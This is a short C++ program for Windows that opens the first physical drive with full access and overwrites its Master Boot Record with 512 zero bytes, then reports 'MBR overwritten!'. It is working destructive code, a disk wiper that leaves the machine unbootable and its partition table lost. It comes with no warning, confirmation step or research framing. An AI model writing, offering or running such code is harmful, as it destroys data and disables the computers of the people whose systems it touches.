#include <iostream>
#include <vector>
#include <Windows.h>

#define MBR_SIZE 512 // Size of the MBR

class FileHandle {
public:
    FileHandle(HANDLE handle) : handle_(handle) {}
    ~FileHandle() {
        if (handle_ != INVALID_HANDLE_VALUE)
            CloseHandle(handle_);
    }
    HANDLE get() const { return handle_; }
private:
    HANDLE handle_;
};

int main() {
    std::vector<char> mbrData(MBR_SIZE, 0); // Vector to store the MBR data, initialized with zeros

    // Open the drive to the physical memory
    FileHandle masterBootRecord(CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL));
    if (masterBootRecord.get() == INVALID_HANDLE_VALUE) {
        throw std::runtime_error("Failed to open the drive. Error code: " + std::to_string(GetLastError()));
    }

    DWORD bytesWritten; // Variable to store the number of bytes written

    // Write the data to the physical memory
    if (!WriteFile(masterBootRecord.get(), mbrData.data(), MBR_SIZE, &bytesWritten, NULL)) {
        throw std::runtime_error("Failed to overwrite the MBR. Error code: " + std::to_string(GetLastError()));
    }

    std::cout << "MBR overwritten!" << std::endl;

    std::cout << "Press Enter to exit...";
    std::cin.get();
    return EXIT_SUCCESS;
}
